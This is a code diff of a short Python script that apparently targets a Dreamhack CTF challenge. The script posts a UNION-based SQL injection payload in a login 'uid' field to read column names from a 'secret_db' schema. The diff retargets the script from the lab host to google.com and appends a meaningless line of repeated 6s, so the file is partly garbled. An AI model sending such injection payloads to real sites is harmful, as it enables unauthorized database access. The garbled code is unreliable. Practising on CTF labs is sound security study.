@@ -1,7 +1,7 @@
 import requests
 
 # 요청할 URL
-url = 'http://host3.dreamhack.games:13793/'
+url = 'https://www.google.com/'
 data = {
     'uid': "' UNION SELECT (SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'onlyflag' AND table_schema = 'secret_db' LIMIT 1), 2, 3, 4--",
     'upw': '1'
@@ -19,3 +19,5 @@ try:
 
 except requests.exceptions.RequestException as e:
     print(f"An error occurred: {e}")
+
+ 6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
